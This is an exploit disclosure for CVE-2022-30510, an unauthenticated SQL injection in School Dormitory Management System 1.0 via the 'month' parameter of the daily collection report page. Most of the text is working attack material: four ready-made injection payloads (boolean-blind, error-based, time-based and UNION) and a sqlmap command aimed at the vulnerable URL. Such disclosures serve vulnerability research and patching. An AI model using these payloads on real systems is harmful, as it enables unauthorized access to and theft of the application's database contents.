# CVE-2022-30510
School Dormitory Management System 1.0 - Unauthenticated SQL Injection

#### Exploit Title: School Dormitory Management System 1.0 - Unauthenticated SQL Injection
#### Date: 2022-05-25
#### CVE: CVE-2022-30510
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15319/school-dormitory-management-system-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----
[#] Vulnerability Location:
	`$_GET['month']` in `/dms/admin/reports/daily_collection_report.php:59`

>Parameter: month (GET)
	Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: page=reports/daily_collection_report&month=2022-05' RLIKE (SELECT (CASE WHEN (2158=2158) THEN 0x323032322d3035 ELSE 0x28 END))-- UWOA
>
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: page=reports/daily_collection_report&month=2022-05' AND (SELECT 1645 FROM(SELECT COUNT(*),CONCAT(0x716a6b6a71,(SELECT (ELT(1645=1645,1))),0x71766b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UlyZ
>
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=reports/daily_collection_report&month=2022-05' AND (SELECT 3409 FROM (SELECT(SLEEP(5)))uaoG)-- rTvo
>
    Type: UNION query
    Title: MySQL UNION query (NULL) - 11 columns
    Payload: page=reports/daily_collection_report&month=2022-05' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a6b6a71,0x46716d4777627770436a6b56566f764c4d6f5a6b476b615041477742414f6979424e4f51744a5563,0x71766b7a71),NULL,NULL#
---

[#] Exploitation Using SQLMAP:
	`sqlmap -u "http://localhost/dms/admin/?page=reports/daily_collection_report&month=2022-05" --dbms=mysql`
